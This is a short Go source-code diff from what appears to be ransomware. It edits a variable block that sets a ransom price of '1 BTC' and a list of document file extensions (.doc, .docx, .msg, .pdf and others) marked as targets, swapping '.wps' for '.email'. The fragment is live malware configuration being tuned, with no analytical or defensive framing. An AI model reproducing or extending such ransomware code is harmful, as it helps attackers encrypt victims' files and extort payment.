@@ -34,7 +34,7 @@ var (
 	Price                 = "1 BTC"
 	InterestingExtensions = []string{
 		// Text Files
-		".doc", ".docx", ".msg", ".odt", ".wpd", ".wps", ".txt",
+		".doc", ".docx", ".msg", ".odt", ".wpd", ".email", ".txt",
 		// Page Layout Files
 		".pdf",
 		// Audio Files
